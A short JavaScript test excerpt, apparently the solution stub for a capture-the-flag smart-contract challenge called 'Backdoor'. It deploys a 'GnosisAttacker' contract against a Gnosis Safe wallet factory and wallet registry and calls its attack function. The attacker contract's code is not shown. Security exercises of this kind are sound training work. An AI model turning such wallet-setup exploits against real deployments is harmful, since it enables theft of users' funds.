...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    let gnosisAttacker = await (
      await ethers.getContractFactory("GnosisAttacker", deployer)
    ).deploy(this.masterCopy.address, this.walletFactory.address);

    await gnosisAttacker
      .connect(attacker)
      .attack(this.token.address, this.walletRegistry.address, users);
  });
